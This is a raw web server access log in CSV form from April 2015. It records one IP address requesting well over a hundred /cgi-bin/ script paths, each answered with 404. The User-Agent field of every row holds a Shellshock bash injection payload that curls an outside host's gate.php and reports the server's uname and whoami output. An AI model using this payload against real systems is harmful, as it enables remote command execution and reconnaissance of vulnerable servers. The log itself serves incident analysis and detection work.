"Host","Log Name","Date Time","Time Zone","Method","URL","Response Code","Bytes Sent","Referer","User Agent"
"180.234.44.185","-","2015-04-12 19:36:01","GMT-0700","GET","/cgi-bin/newsdesk.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:02","GMT-0700","GET","/cgi-bin/netpad.cgi",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:02","GMT-0700","GET","/cgi-bin/netauth.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:03","GMT-0700","GET","/cgi-bin/myguestbook.cgi",404,545,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:07","GMT-0700","GET","/cgi-bin/mt-static/mt-load.cgi",404,551,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:08","GMT-0700","GET","/cgi-bin/mt-static/mt-check.cgi",404,552,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:08","GMT-0700","GET","/cgi-bin/mrtg.cgi",404,538,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:09","GMT-0700","GET","/cgi-bin/mojo/mojo.cgi",404,543,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:10","GMT-0700","GET","/cgi-bin/moin.cgi",404,538,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:11","GMT-0700","GET","/cgi-bin/mmstdod.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:11","GMT-0700","GET","/cgi-bin/mini_logger.cgi",404,545,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:12","GMT-0700","GET","/cgi-bin/man.sh",404,536,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:14","GMT-0700","GET","/cgi-bin/main.cgi",404,538,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:15","GMT-0700","GET","/cgi-bin/mailnews.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:16","GMT-0700","GET","/cgi-bin/maillist.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:17","GMT-0700","GET","/cgi-bin/mail/nph-mr.cgi",404,545,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:18","GMT-0700","GET","/cgi-bin/mail/emumail.cgi",404,546,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:18","GMT-0700","GET","/cgi-bin/magiccard.cgi",404,543,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:20","GMT-0700","GET","/cgi-bin/lwgate.cgi",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:21","GMT-0700","GET","/cgi-bin/lookwho.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:21","GMT-0700","GET","/cgi-bin/logit.cgi",404,539,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:22","GMT-0700","GET","/cgi-bin/login.cgi",404,539,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:23","GMT-0700","GET","/cgi-bin/log-reader.cgi",404,544,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:24","GMT-0700","GET","/cgi-bin/loadpage.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:24","GMT-0700","GET","/cgi-bin/lastlines.cgi",404,543,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:25","GMT-0700","GET","/cgi-bin/journal.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:27","GMT-0700","GET","/cgi-bin/infosrch.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:28","GMT-0700","GET","/cgi-bin/ImageFolio/admin/admin.cgi",404,556,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:28","GMT-0700","GET","/cgi-bin/imageFolio.cgi",404,544,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:29","GMT-0700","GET","/cgi-bin/ikonboard/help.cgi",404,548,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:30","GMT-0700","GET","/cgi-bin/if/admin/nph-build.cgi",404,552,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:32","GMT-0700","GET","/cgi-bin/htsearch.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:35","GMT-0700","GET","/cgi-bin/hsx.cgi",404,537,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:36","GMT-0700","GET","/cgi-bin/hitview.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:38","GMT-0700","GET","/cgi-bin/handler.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:39","GMT-0700","GET","/cgi-bin/guestbook.cgi",404,543,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:40","GMT-0700","GET","/cgi-bin/gm.cgi",404,536,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:41","GMT-0700","GET","/cgi-bin/gm-cplog.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:41","GMT-0700","GET","/cgi-bin/gm-authors.cgi",404,544,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:42","GMT-0700","GET","/cgi-bin/gH.cgi",404,536,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:43","GMT-0700","GET","/cgi-bin/getdoc.cgi",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:44","GMT-0700","GET","/cgi-bin/generate.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:44","GMT-0700","GET","/cgi-bin/gbook/gbook.cgi",404,545,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:45","GMT-0700","GET","/cgi-bin/gbadmin.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:46","GMT-0700","GET","/cgi-bin/FormMail.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:47","GMT-0700","GET","/cgi-bin/FormHandler.cgi",404,545,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:48","GMT-0700","GET","/cgi-bin/fom/fom.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:49","GMT-0700","GET","/cgi-bin/fom.cgi",404,537,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:49","GMT-0700","GET","/cgi-bin/flexform.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:50","GMT-0700","GET","/cgi-bin/finger.cgi",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:51","GMT-0700","GET","/cgi-bin/FileSeek2.cgi",404,543,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:52","GMT-0700","GET","/cgi-bin/FileSeek.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:52","GMT-0700","GET","/cgi-bin/faqmanager.cgi",404,544,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:53","GMT-0700","GET","/cgi-bin/ezshopper3/loadpage.cgi",404,553,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:54","GMT-0700","GET","/cgi-bin/ezshopper2/loadpage.cgi",404,553,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:55","GMT-0700","GET","/cgi-bin/ezshopper/search.cgi",404,550,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:56","GMT-0700","GET","/cgi-bin/ezshopper/loadpage.cgi",404,552,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:56","GMT-0700","GET","/cgi-bin/ezman.cgi",404,539,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:57","GMT-0700","GET","/cgi-bin/ezboard.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:58","GMT-0700","GET","/cgi-bin/ezadmin.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:59","GMT-0700","GET","/cgi-bin/environ.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:36:59","GMT-0700","GET","/cgi-bin/enter.cgi",404,539,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:00","GMT-0700","GET","/cgi-bin/emumail/emumail.cgi",404,549,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:01","GMT-0700","GET","/cgi-bin/emumail.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:02","GMT-0700","GET","/cgi-bin/emu/html/emumail.cgi",404,550,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:03","GMT-0700","GET","/cgi-bin/download.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:06","GMT-0700","GET","/cgi-bin/diagnose.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:07","GMT-0700","GET","/cgi-bin/dfire.cgi",404,539,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:08","GMT-0700","GET","/cgi-bin/dcforum.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:09","GMT-0700","GET","/cgi-bin/dbman/db.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:10","GMT-0700","GET","/cgi-bin/db_manager.cgi",404,544,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:11","GMT-0700","GET","/cgi-bin/day5datanotifier.cgi",404,550,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:11","GMT-0700","GET","/cgi-bin/day5datacopier.cgi",404,548,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:12","GMT-0700","GET","/cgi-bin/cvsqueryform.cgi",404,546,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:13","GMT-0700","GET","/cgi-bin/cvsquery.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:14","GMT-0700","GET","/cgi-bin/cvslog.cgi",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:14","GMT-0700","GET","/cgi-bin/cvsblame.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:15","GMT-0700","GET","/cgi-bin/csv_db.cgi",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:16","GMT-0700","GET","/cgi-bin/csSearch.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:17","GMT-0700","GET","/cgi-bin/csPassword/csPassword.cgi",404,555,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:17","GMT-0700","GET","/cgi-bin/csPassword.cgi",404,544,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:18","GMT-0700","GET","/cgi-bin/csNewsPro.cgi",404,543,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:19","GMT-0700","GET","/cgi-bin/csNews.cgi",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:20","GMT-0700","GET","/cgi-bin/CSMailto/CSMailto.cgi",404,551,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:20","GMT-0700","GET","/cgi-bin/CSMailto.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:21","GMT-0700","GET","/cgi-bin/csLiveSupport.cgi",404,547,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:22","GMT-0700","GET","/cgi-bin/csGuestBook.cgi",404,545,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:23","GMT-0700","GET","/cgi-bin/csChatRBox.cgi",404,544,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:23","GMT-0700","GET","/cgi-bin/Count.cgi",404,539,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:24","GMT-0700","GET","/cgi-bin/compatible.cgi",404,544,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:26","GMT-0700","GET","/cgi-bin/commerce.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:27","GMT-0700","GET","/cgi-bin/commandit.cgi",404,543,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:28","GMT-0700","GET","/cgi-bin/classifieds/index.cgi",404,551,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:28","GMT-0700","GET","/cgi-bin/classifieds/classifieds.cgi",404,557,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:29","GMT-0700","GET","/cgi-bin/classifieds.cgi",404,545,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:30","GMT-0700","GET","/cgi-bin/classified.cgi",404,544,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:34","GMT-0700","GET","/cgi-bin/ccvsblame.cgi",404,543,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:34","GMT-0700","GET","/cgi-bin/cbmc/forums.cgi",404,545,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:35","GMT-0700","GET","/cgi-bin/cartmanager.cgi",404,545,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:36","GMT-0700","GET","/cgi-bin/calendar/index.cgi",404,548,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:37","GMT-0700","GET","/cgi-bin/cachemgr.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:38","GMT-0700","GET","/cgi-bin/cached_feed.cgi",404,545,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:38","GMT-0700","GET","/cgi-bin/c_download.cgi",404,544,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:39","GMT-0700","GET","/cgi-bin/bulk/bulk.cgi",404,543,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:40","GMT-0700","GET","/cgi-bin/build.cgi",404,539,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:41","GMT-0700","GET","/cgi-bin/bslist.cgi",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:41","GMT-0700","GET","/cgi-bin/bsguest.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:42","GMT-0700","GET","/cgi-bin/boozt/admin/index.cgi",404,551,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:43","GMT-0700","GET","/cgi-bin/book.cgi",404,538,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:44","GMT-0700","GET","/cgi-bin/bnbform.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:45","GMT-0700","GET","/cgi-bin/blog/mt-load.cgi",404,546,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:45","GMT-0700","GET","/cgi-bin/blog/mt-check.cgi",404,547,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:46","GMT-0700","GET","/cgi-bin/bizdb1-search.cgi",404,547,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:47","GMT-0700","GET","/cgi-bin/bigconf.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:48","GMT-0700","GET","/cgi-bin/bbs_forum.cgi",404,543,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:49","GMT-0700","GET","/cgi-bin/BBS/bbs_forum.cgi",404,547,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:54","GMT-0700","GET","/cgi-bin/bannereditor.cgi",404,546,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:55","GMT-0700","GET","/cgi-bin/banner.cgi",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:55","GMT-0700","GET","/cgi-bin/badmin.cgi",404,540,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:56","GMT-0700","GET","/cgi-bin/axs.cgi",404,537,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:57","GMT-0700","GET","/cgi-bin/ax.cgi",404,536,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:37:59","GMT-0700","GET","/cgi-bin/auktion.cgi",404,541,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:00","GMT-0700","GET","/cgi-bin/auction/auction.cgi",404,549,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:00","GMT-0700","GET","/cgi-bin/AT-generate.cgi",404,545,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:04","GMT-0700","GET","/cgi-bin/architext_query.cgi",404,549,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:06","GMT-0700","GET","/cgi-bin/AnyBoard.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:06","GMT-0700","GET","/cgi-bin/alienform.cgi",404,543,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:07","GMT-0700","GET","/cgi-bin/aglimpse.cgi",404,542,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
"180.234.44.185","-","2015-04-12 19:38:08","GMT-0700","GET","/cgi-bin/af.cgi",404,536,"http://google.com","() { :; }; curl http://85.18.113.32/gate.php?w1-`uname`-`uname -p`-`whoami`"
